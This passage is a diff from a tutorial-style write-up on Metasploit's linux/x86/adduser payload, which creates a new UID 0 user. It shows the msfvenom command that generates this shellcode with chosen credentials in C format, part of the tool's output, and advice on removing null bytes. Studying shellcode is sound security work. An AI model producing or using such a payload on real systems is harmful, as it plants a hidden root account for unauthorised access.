@@ -45,11 +45,12 @@ USER   metasploit       yes       The username to create
 Description:
   Create a new user with UID 0
 [...]
+```
 The current setting for this payload is metasploit for both the PASS and USER field, of-course we can customize it by our own.
 The following command generates a shell-code with the value oxdipsy as a username and as a password in c formatting.
 
 Note that the shell-code contains zeros, you can exclude them by specifying \x00 as a bad character with -b '\x00'
-
+```
 dipsy@kali:~$ msfvenom -p linux/x86/adduser USER=oxdipsy PASS=oxdipsy -f c
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
